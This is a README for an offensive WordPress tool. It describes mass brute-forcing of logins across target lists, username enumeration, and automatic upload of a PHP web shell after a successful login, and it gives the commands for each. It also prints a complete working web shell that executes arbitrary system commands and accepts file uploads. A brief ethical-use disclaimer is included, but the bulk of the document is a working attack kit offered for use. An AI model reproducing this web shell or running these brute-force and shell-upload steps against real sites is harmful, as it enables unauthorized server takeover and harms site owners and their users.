# k0ur1i WordPress Tool
## Author: k0ur1i
## Version: 1.0

## Overview
This tool is a versatile CLI-based WordPress security tester designed to automate:

Brute Force Attacks to test WordPress login credentials.
User Enumeration to discover valid usernames.
Auto Shell Upload to simulate PHP shell exploitation upon successful login.


```

██████╗░░██████╗░███████╗███████╗░██████╗░░█████╗░██████╗░██████╗
██╔══██╗██╔════╝░██╔════╝██╔════╝██╔════╝░██╔══██╗██╔══██╗██╔══██╗
██║░░██║██║░░░░░░█████╗░░█████╗░░██║░░██╗░███████║██║░░██║██║░░██║
██║░░██║██║░░░░░░██╔══╝░░██╔══╝░░██║░░╚██╗██╔══██║██║░░██║██║░░██║
██████╔╝╚██████╗░███████╗███████╗╚██████╔╝██║░░██║██████╔╝██████╔╝
╚═════╝░░╚═════╝░░╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═════╝░

by k0ur1i

--------------------------------------------------
[INFO] Current Date and Time:  2024-11-28 12:34:56
--------------------------------------------------
[1] Brute Force Attack
[2] User Enumeration
[3] Auto Upload PHP Shell
[4] Exit
Choose an option: 
```


## Features
1. Multi-target brute force support.
2. Customizable username and password wordlists.
3. User enumeration for discovering valid accounts.
4. Automatic PHP shell upload upon login success.
5. Fast, multithreaded execution.
   

## Requirements
```pip install -r requirements.txt ```

1. Python 3.8+
2. ```git clone https://github.com/00xk0uR1i/kouriBruter ```
3. Run the script:
# Brute Force Attack

    - `python3 run.py -T targets.txt -U users.txt -P passlist.txt -t 10 --timeout 10`

    -T: Target file containing URLs of WordPress sites.
    -U: User list file for usernames.
    -P: Password list file for brute-forcing.
    -t: Number of threads (default 10).
    --timeout: HTTP request timeout in seconds (default 10).
 # User Enumeration

   
    - `python3 run.py -T targets.txt -U users.txt --enumerate` ✨ new ✨
    - `--enumerate: Enumerate usernames without brute-forcing.` ✨ new ✨
 # Auto Upload PHP Shell

    - `python3 run.py -T targets.txt -U users.txt -P passlist.txt --upload-shell shell.php`
    - `--upload-shell: Specify the path to a PHP shell file for automatic upload.` ✨ new ✨
    
# example 
```python3 run.py```
1. Select [1] for brute force.
2. Input paths to targets.txt, users.txt, and passlist.txt.
3. The tool will attempt login credentials and display successful attempts.

This tool is intended for ethical use only. Unauthorized testing or exploitation is illegal and may result in severe consequences. Use it only on systems you own or have explicit permission to test. **Note**: They might not get updated frequently and are kept for legacy reasons:

- `Configure the script` (Add your Shodan API key:
SHODAN_API_KEY = "your_shodan_api_key")
- `Add your ZoomEye API key (if applicable).
   Configure the Nuclei path and templates.` (legacy)

## Example Exploit Script

```

<?php
// Simple PHP Web Shell

if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}

if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
    die;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>k0ur1i Shell</title>
</head>
<body>
    <h1>Welcome to k0ur1i Shell</h1>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command">
        <button type="submit">Execute</button>
    </form>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>
</body>
</html>

```


Note:

## This tools for ethical hacker I am Not responsible for any bad use .

## License
# This project is licensed under the MIT License.

>thanks for all 
